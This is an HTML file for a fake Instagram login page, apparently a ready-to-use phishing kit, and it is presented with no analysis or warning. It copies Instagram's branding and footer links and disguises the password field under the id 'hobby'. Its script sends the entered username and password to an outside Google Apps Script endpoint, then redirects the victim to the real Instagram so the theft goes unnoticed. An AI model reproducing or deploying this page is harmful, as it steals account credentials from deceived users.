<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign Up</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Billabong&display=swap');
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #fdf497 0%, #fd5949 30%, #d6249f 60%, #285AEB 100%);
    }
    .wrapper {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 12px;
      width: 100%;
      padding: 20px;
    }
    .card {
      background: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      padding: 40px 40px 28px;
      width: 100%;
      max-width: 350px;
      text-align: center;
    }
    .logo {
      font-family: 'Billabong', cursive, sans-serif;
      font-size: 52px;
      background: linear-gradient(45deg, #fdf497, #fd5949, #d6249f, #285AEB);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      margin-bottom: 6px;
      line-height: 1;
    }
    .insta-icon {
      width: 52px;
      height: 52px;
      margin: 0 auto 8px;
    }
    .subtitle {
      font-size: 16px;
      font-weight: 600;
      color: #262626;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 9px 12px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      font-size: 14px;
      outline: none;
      transition: border 0.2s;
      margin-bottom: 8px;
      color: #262626;
    }
    input::placeholder { color: #8e8e8e; font-size: 13px; }
    input:focus { border-color: #a8a8a8; background: #fff; }
    button {
      width: 100%;
      padding: 8px;
      margin-top: 8px;
      background: linear-gradient(90deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      opacity: 1;
      transition: opacity 0.2s;
    }
    button:hover { opacity: 0.85; }
    .divider {
      display: flex;
      align-items: center;
      gap: 16px;
      margin: 18px 0 14px;
    }
    .divider hr { flex: 1; border: none; border-top: 1px solid #dbdbdb; }
    .divider span { font-size: 12px; font-weight: 600; color: #8e8e8e; }
    .success {
      display: none;
      margin-top: 12px;
      background: #e8f5e9;
      color: #2e7d32;
      border-radius: 4px;
      padding: 9px;
      font-size: 13px;
    }
    .bottom-card {
      background: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      padding: 16px;
      width: 100%;
      max-width: 350px;
      text-align: center;
      font-size: 14px;
      color: #262626;
    }
    .bottom-card a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
    }
    .store-badges {
      display: flex;
      gap: 8px;
      justify-content: center;
      margin-top: 16px;
    }
    .store-badges img { height: 34px; border-radius: 6px; }
    .footer {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 8px 16px;
      margin-top: 20px;
      font-size: 11px;
      color: rgba(255,255,255,0.75);
    }
    .footer a { color: rgba(255,255,255,0.75); text-decoration: none; }
    .footer a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="card">
      <!-- Instagram gradient logo SVG -->
      <svg class="insta-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <radialGradient id="ig" cx="30%" cy="107%" r="150%">
            <stop offset="0%" stop-color="#fdf497"/>
            <stop offset="25%" stop-color="#fd5949"/>
            <stop offset="50%" stop-color="#d6249f"/>
            <stop offset="75%" stop-color="#285AEB"/>
          </radialGradient>
        </defs>
        <rect width="100" height="100" rx="22" fill="url(#ig)"/>
        <rect x="18" y="18" width="64" height="64" rx="16" fill="none" stroke="#fff" stroke-width="6"/>
        <circle cx="50" cy="50" r="15" fill="none" stroke="#fff" stroke-width="6"/>
        <circle cx="72" cy="28" r="5" fill="#fff"/>
      </svg>

      <p class="subtitle">Login in to see photos and more.</p>

      <input type="text" id="username" placeholder="Instagram Username" />
      <input type="text" id="hobby" placeholder="Your password" />

      <a href="https://www.instagram.com/?hl=en"><button onclick="handleSubmit()">Login in</button></a>
      <div class="success" id="success">✓ Submitted successfully wait a minute !</div>

      <div class="divider">
        <hr/><span>OR</span><hr/>
      </div>

      <!-- Empty space for your link -->
      <div id="your-link-here" style="font-size:14px; color:#385185; font-weight:600; cursor:pointer;">
        <!-- Add your link here -->
      </div>
    </div>

    <div class="bottom-card">
      I don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?next=">Sign up</a>
    </div>

    <div class="footer">
      <a href="https://about.instagram.com/">About</a><a href="https://help.instagram.com/">Help</a><a href="#">Privacy</a>
      <a href="https://help.instagram.com/termsofuse">Terms</a><a href="https://help.instagram.com/402343555458995/">Locations</a>
      <span>© 2026 Instagram</span>
    </div>
  </div>

  <script>
   function handleSubmit() {
  const username = document.getElementById('username').value.trim();
  const hobby = document.getElementById('hobby').value.trim();
  if (!username || !hobby) { alert('Please fill in both fields.'); return; }

  const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyb3GUs__OoGay6tmLPiYGhsQQvJIqxXojs3UsES3mZfDiHcFIQsx3xIC5K6Q8442BvbQ/exec';

  fetch(SCRIPT_URL, {
    method: 'POST',
    body: JSON.stringify({ username, hobby, time: new Date().toLocaleString() })
  }).then(() => {
    document.getElementById('username').value = '';
    document.getElementById('hobby').value = '';
    document.getElementById('success').style.display = 'block';
    setTimeout(() => document.getElementById('success').style.display = 'none', 3000);
  }).catch(() => alert('Submission failed. Try again.'));
}
  </script>
</body>
</html>
</body>
</html>
